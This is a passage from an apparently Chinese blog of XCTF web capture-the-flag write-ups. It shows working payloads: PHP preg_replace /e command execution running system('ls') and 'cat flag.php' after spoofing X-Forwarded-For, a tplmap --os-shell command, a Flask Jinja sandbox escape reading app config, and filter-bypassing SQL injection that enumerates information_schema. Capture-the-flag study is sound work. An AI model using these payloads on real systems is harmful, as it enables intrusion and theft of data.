</span></span><span class="line"><span class="cl"><span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">page</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$page</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">ctype_alnum</span><span class="p">(</span><span class="nv">$page</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;div style=&#34;text-align:center&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;p class=&#34;lead&#34;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">}else{
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;div style=&#34;text-align:center&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;p class=&#34;lead&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;?php
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">                if (strpos($page, &#39;input&#39;) &gt; 0) {
</span></span></span><span class="line"><span class="cl"><span class="err">                    die();
</span></span></span><span class="line"><span class="cl"><span class="err">                }
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">                if (strpos($page, &#39;ta:text&#39;) &gt; 0) {
</span></span></span><span class="line"><span class="cl"><span class="err">                    die();
</span></span></span><span class="line"><span class="cl"><span class="err">                }
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">                if (strpos($page, &#39;text&#39;) &gt; 0) {
</span></span></span><span class="line"><span class="cl"><span class="err">                    die();
</span></span></span><span class="line"><span class="cl"><span class="err">                }
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">                if ($page === &#39;index.php&#39;) {
</span></span></span><span class="line"><span class="cl"><span class="err">                    die(&#39;Ok&#39;);
</span></span></span><span class="line"><span class="cl"><span class="err">                }
</span></span></span><span class="line"><span class="cl"><span class="err">                    include($page);
</span></span></span><span class="line"><span class="cl"><span class="err">                    die();
</span></span></span><span class="line"><span class="cl"><span class="err">                ?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;/p&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="err">}}
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">//æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] === &#39;127.0.0.1&#39;) {
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">    echo &#34;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&#34;;
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">    $pattern = $_GET[pat];
</span></span></span><span class="line"><span class="cl"><span class="err">    $replacement = $_GET[rep];
</span></span></span><span class="line"><span class="cl"><span class="err">    $subject = $_GET[sub];
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) {
</span></span></span><span class="line"><span class="cl"><span class="err">        preg_replace($pattern, $replacement, $subject);
</span></span></span><span class="line"><span class="cl"><span class="err">    }else{
</span></span></span><span class="line"><span class="cl"><span class="err">        die();
</span></span></span><span class="line"><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">}
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ctype_alnum($text)å‡½æ•°ä¼šåŒ¹é…ä¼ å…¥å‚æ•°ä¸­æ˜¯å¦å…¨ä¸ºæ•°å­—æˆ–è€…å­—æ¯ï¼Œå¦‚æœæ˜¯è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚
</span></span><span class="line"><span class="cl">strpos(string,find,start) å‡½æ•°æŸ¥æ‰¾findåœ¨å¦ä¸€å­—ç¬¦ä¸²stringä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆå¤§å°å†™æ•æ„Ÿï¼‰ã€‚
</span></span><span class="line"><span class="cl">preg_replace($pattern, $replacement, $subject)å‡½æ•°ä¼šå°†subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ç”¨replacementæ›¿æ¢ï¼Œå¦‚æœå¯ç”¨/eå‚æ•°çš„è¯ï¼Œå°±ä¼šå°†replacementå½“åšphpä»£ç æ‰§è¡Œã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¥ä¸‹æ¥å°±æ˜¯æŠ“åŒ…æŠŠX-Forwarded-For:127.0.0.1,ç„¶ååˆ©ç”¨preg/eæ¼æ´</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119133713268.png"
	width="1570"
	height="785"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119133713268_hu15742616837383222431.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119133713268_hu27780829575703322.png 1024w"
	loading="lazy"
	
		alt="image-20250119133713268"
	
	
		class="gallery-image" 
		data-flex-grow="200"
		data-flex-basis="480px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?pat=/1/e&amp;rep=system(&#34;ls&#34;)&amp;sub=1
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119135923227.png"
	width="1478"
	height="713"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119135923227_hu17159282961983644091.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119135923227_hu13629701493100885064.png 1024w"
	loading="lazy"
	
		alt="image-20250119135923227"
	
	
		class="gallery-image" 
		data-flex-grow="207"
		data-flex-basis="497px"
	
></p>
<p>å› ä¸ºä¸Šé¢ctype_alnumå‡½æ•°è§„å®šåªèƒ½æ˜¯æ•°å­—å’Œå­—æ¯ï¼Œæ‰€ä»¥è¦ç”¨urlç¼–ç </p>
<p>;ç”¨%3bæˆ–è€…ä¸¤ä¸ª&amp;&amp;ç”¨%26%26</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?pat=/1/e&amp;rep=system(&#34;cd%20s3chahahaDir%3bls&#34;)&amp;sub=1
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119140359168.png"
	width="1547"
	height="805"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119140359168_hu4406484529133645255.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119140359168_hu17822031115820913198.png 1024w"
	loading="lazy"
	
		alt="image-20250119140359168"
	
	
		class="gallery-image" 
		data-flex-grow="192"
		data-flex-basis="461px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?pat=/1/e&amp;rep=system(&#34;cd%20s3chahahaDir/flag%3bcat%20flag.php&#34;)&amp;sub=1
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119140509847.png"
	width="1575"
	height="817"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119140509847_hu18006935736999393254.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119140509847_hu8182454460828114968.png 1024w"
	loading="lazy"
	
		alt="image-20250119140509847"
	
	
		class="gallery-image" 
		data-flex-grow="192"
		data-flex-basis="462px"
	
></p>
<h2 id="easytornado">easytornado
</h2><p>é¢˜ç›®æç¤ºflagåœ¨/fllllllllllllag</p>
<p>ç„¶åhint.txtä¸­è¯´ä¼ å‚æ–¹å¼æ˜¯md5(secret_cookie+md5(æ–‡ä»¶å))</p>
<p>æˆ‘ä»¬è¦æ‹¿åˆ°secret_cookieå°±èƒ½è§£å†³</p>
<p>é¢˜ç›®åå­—æ˜¯tornadoæ¡†æ¶</p>
<p>æˆ‘ä»¬ä¸æœæ¡ä»¶ä¼ å‚</p>
<p>å‡ºç°error</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119141408302.png"
	width="1248"
	height="696"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119141408302_hu12500444631557321478.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119141408302_hu7290029422396411453.png 1024w"
	loading="lazy"
	
		alt="image-20250119141408302"
	
	
		class="gallery-image" 
		data-flex-grow="179"
		data-flex-basis="430px"
	
></p>
<p>â€‹	ç„¶åç»™errorçš„msgä¼ å€¼</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119141445713.png"
	width="1503"
	height="800"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119141445713_hu4970935745476587387.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119141445713_hu8189329653289637027.png 1024w"
	loading="lazy"
	
		alt="image-20250119141445713"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="450px"
	
></p>
<p>æ£€æµ‹æœ‰æ²¡æœ‰sstiæ¼æ´</p>
<p>å¯åŠ¨tplmap</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python tplmap.py -u &#34;ip&#34;
</span></span><span class="line"><span class="cl">å¦‚æœæœ‰ç”¨ä¼šå›æ˜¾æ¨¡æ¿è€Œä¸”å¯ä»¥ç›´æ¥--engine xx --os-shell
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é¢˜æ²¡æœ‰</p>
<p>åœ¨Tornadoé‡Œï¼Œåº”ç”¨çš„è®¾ç½®å¯ä»¥é€šè¿‡handler.settingsè®¿é—®ã€‚</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119144331589.png"
	width="1796"
	height="715"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119144331589_hu8046016296789855936.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119144331589_hu16492694008952527173.png 1024w"
	loading="lazy"
	
		alt="image-20250119144331589"
	
	
		class="gallery-image" 
		data-flex-grow="251"
		data-flex-basis="602px"
	
></p>
<p>æ‹¿åˆ°secret_cookie</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯md5åŠ å¯†å¾—åˆ°flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">3762f300-baaf-466d-b133-c787da072acf3bf9f6cf685a6dd8defadabfb41a03a1
</span></span><span class="line"><span class="cl">420186c23b1519d4196940a9bfe11348
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119144656994.png"
	width="1443"
	height="679"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119144656994_hu2529771689696394332.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119144656994_hu1337245768045527773.png 1024w"
	loading="lazy"
	
		alt="image-20250119144656994"
	
	
		class="gallery-image" 
		data-flex-grow="212"
		data-flex-basis="510px"
	
></p>
<h2 id="shrine">shrine
</h2><p>ä¸Šæ¥ç»™æºç ï¼Œå‘ç°flaskæ¡†æ¶ï¼Œæƒ³åˆ°SSTIæ¨¡æ¿æ³¨å…¥</p>
<p>æºç é‡Œé¢æœ‰/shrine/</p>
<p>æ‹¼æ¥æµ‹è¯•ä¸€ä¸‹</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119152936908.png"
	width="1270"
	height="666"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119152936908_hu4366008145850413104.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119152936908_hu16383468626943631136.png 1024w"
	loading="lazy"
	
		alt="image-20250119152936908"
	
	
		class="gallery-image" 
		data-flex-grow="190"
		data-flex-basis="457px"
	
></p>
<p>ç¡®å®å­˜åœ¨</p>
<p>ä½†æ˜¯å·¥å…·ä¸€æŠŠæ¢­ä¸å‡ºæ¥</p>
<p>å›åˆ°æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">flask</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;FLAG&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;FLAG&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/shrine/&lt;path:shrine&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">shrine</span><span class="p">(</span><span class="n">shrine</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">safe_jinja</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;(&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;config&#39;</span><span class="p">,</span> <span class="s1">&#39;self&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;{</span><span class="si">% r</span><span class="s1">aw %}{</span><span class="si">%%</span><span class="s1"> set </span><span class="si">%s</span><span class="s1">=None</span><span class="si">%%</span><span class="s1">}{</span><span class="si">% e</span><span class="s1">ndraw %}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">])</span> <span class="o">+</span> <span class="n">s</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">flask</span><span class="o">.</span><span class="n">render_template_string</span><span class="p">(</span><span class="n">safe_jinja</span><span class="p">(</span><span class="n">shrine</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä»–å°†configå’Œselfå½“æˆäº†é»‘åå• è€Œflagåœ¨configæ–‡ä»¶é‡Œ
å¦‚æœæ²¡æœ‰é»‘åå•çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥ configï¼Œæˆ–è€…ä¼ å…¥{{self.<em>dict</em>}}è·å–ï¼Œä½†å½“è¿™äº›è¢«è¿‡æ»¤çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦å€ŸåŠ©ä¸€äº›å…¨å±€å˜é‡åˆ©ç”¨æ²™ç›’é€ƒé€¸çš„æ–¹æ³•ï¼Œæ¥è°ƒç”¨è¢«ç¦ç”¨çš„å‡½æ•°å¯¹è±¡ã€‚</p>
<p>æˆ‘ä»¬è¾“å…¥çš„å€¼é¦–å…ˆè¢«ä¼ åˆ°äº†safe_jinjaå‡½æ•°ï¼Œç„¶åç”±flask.render_template_stringè¿›è¡Œæ¸²æŸ“
ä¼ å…¥çš„ï¼ˆ ï¼‰éƒ½ä¼šè¢«ç½®æ¢ä¸ºç©º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ç”¨å…¨å±€å˜é‡ä»£ç†current_appç»•è¿‡ï¼ŒæŸ¥çœ‹config
</span></span><span class="line"><span class="cl">{{url_for.__globals__[&#39;current_app&#39;].config}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>å®˜æ–¹wp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{get_flashed_messages.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]}}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="fakebook">fakebook
</h2><p>ç›®å½•æ‰«æå‘ç°flag.phpå’Œrobots.txt</p>
<p>ç›´æ¥è®¿é—®flag.phpæ²¡ç»“æœï¼Œè®¿é—®robots.txt</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120104855137.png"
	width="1402"
	height="631"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120104855137_hu4283240280899446503.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120104855137_hu14342533120812034036.png 1024w"
	loading="lazy"
	
		alt="image-20250120104855137"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="533px"
	
></p>
<p>ä¸‹è½½user.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$httpCode</span> <span class="o">=</span> <span class="nx">curl_getinfo</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLINFO_HTTP_CODE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$httpCode</span> <span class="o">==</span> <span class="mi">404</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">404</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œæœ‰curl_execå‡½æ•°æ‰€æœ‰å­˜åœ¨SSRFæ¼æ´</p>
<p>åˆ›å»ºä¸€ä¸ªç”¨æˆ·</p>
<p>æœ‰noä½œä¸ºå‚æ•°ï¼Œå°è¯•ä¸€ä¸‹ä¼ªåè®®è¯»å–flag.phpï¼Œå›æ˜¾æ˜¯sqlæ•°æ®åº“çš„æŠ¥é”™</p>
<p>è¯´æ˜noå‚æ•°å¯ä»¥sqlæ³¨å…¥</p>
<p>æ²¡æœ‰é—­åˆ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?no=1 and 1=1 order by 4#
</span></span><span class="line"><span class="cl">?no=-1 union select 1,2,3,4#
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™è¾¹å›æ˜¾no hackï¼Œè‚¯å®šè¿‡æ»¤äº†ä»€ä¹ˆ</p>
<p>å…ˆæ£€æµ‹ç©ºæ ¼</p>
<p>ç”¨/**/è¿‡æ»¤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?no=-1/**/union/**/select/**/1,2,3,4#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120113238376.png"
	width="1815"
	height="622"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120113238376_hu2937317610874725887.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120113238376_hu4694771682945304854.png 1024w"
	loading="lazy"
	
		alt="image-20250120113238376"
	
	
		class="gallery-image" 
		data-flex-grow="291"
		data-flex-basis="700px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">å› ä¸ºæ˜¯ç¬¬äºŒä¸ªä½ç½®å›æ˜¾
</span></span><span class="line"><span class="cl">?no=-1/**/union/**/select/**/1,group_concat(schema_name),3,4/**/from information_schema.schemata--+
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120113540215.png"
	width="1680"
	height="672"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120113540215_hu5805633468513703291.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120113540215_hu14522959530345294471.png 1024w"
	loading="lazy"
	
		alt="image-20250120113540215"
	
	
		class="gallery-image" 
		data-flex-grow="250"
		data-flex-basis="600px"
	
></p>
<p>æŸ¥çœ‹fakebook</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?no=-1/**/union/**/select 1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=database()--+//æˆ–è€…æ˜¯table_schemaa=&#39;fakebook&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‡ºç°users</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?no=-1/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_name=&#39;users&#39;--+
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120114354216.png"
	width="1753"
	height="691"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120114354216_hu15075233471750827866.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120114354216_hu15698735692786285370.png 1024w"
	loading="lazy"
	
		alt="image-20250120114354216"
	
	
		class="gallery-image" 
		data-flex-grow="253"
		data-flex-basis="608px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
